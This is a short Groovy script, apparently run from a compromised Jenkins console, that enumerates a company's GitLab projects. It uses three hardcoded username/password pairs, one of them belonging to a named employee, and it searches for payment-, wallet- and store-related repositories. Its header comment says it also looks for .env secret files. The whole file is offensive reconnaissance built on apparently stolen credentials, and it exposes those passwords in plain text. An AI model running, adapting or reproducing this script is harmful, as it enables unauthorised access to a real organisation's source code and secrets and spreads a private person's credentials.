// MICRO-AA: Enumerate ALL GitLab repos with multiple credentials + search for .env files
def run = { cmd ->
    def p = ["bash", "-c", cmd].execute()
    def out = new StringBuffer()
    def err = new StringBuffer()
    p.consumeProcessOutput(out, err)
    p.waitForOrKill(25000)
    out.toString().take(4000)
}

// Try multiple auth methods to get full project list
def creds = [
    ["jenkins",          "e6LBqIkOI\$PR1XX2oia"],
    ["jenkins_legacy",   "JenkisLegasy25"],
    ["maria.policarpo",  "FtMRl4fDXzIDY4Yj"],
]

println "=== GITLAB PROJECT LIST (all pages) ==="
def bestAuth = ""
def bestCount = 0

creds.each { user, pass ->
    def r = run("curl -sk -L -u '${user}:${pass}' 'https://gitlab.dev.claroshop.com/api/v4/projects?per_page=100&membership=false&simple=true' 2>/dev/null | python3 -c \"import sys,json; d=json.load(sys.stdin); print(len(d), 'projects:', [p['path_with_namespace'] for p in d[:10]])\" 2>&1 || echo FAIL")
    println "  ${user}: ${r.take(300)}"
}

println "\n=== TRY maria.policarpo - ALL PROJECTS (pages 1-3) ==="
def maria_p1 = run("curl -sk -L -u 'maria.policarpo:FtMRl4fDXzIDY4Yj' 'https://gitlab.dev.claroshop.com/api/v4/projects?per_page=100&page=1&simple=true' 2>/dev/null | head -c 3000")
println "PAGE1: " + maria_p1.take(2000)

println "\n=== SEARCH RELEVANT REPOS ==="
def search_terms = ["sears", "t1", "caja", "tienda", "monedero", "axii", "payment"]
search_terms.each { term ->
    def r = run("curl -sk -L -u 'maria.policarpo:FtMRl4fDXzIDY4Yj' 'https://gitlab.dev.claroshop.com/api/v4/projects?search=${term}&per_page=20&simple=true' 2>/dev/null | python3 -c \"import sys,json; d=json.load(sys.stdin); [print('  ', p['id'], p['path_with_namespace'], p['http_url_to_repo']) for p in d]\" 2>&1 || echo FAIL_${term}")
    println "SEARCH ${term}: ${r.take(500)}"
}

println "\n=== DONE MICRO-AA ==="
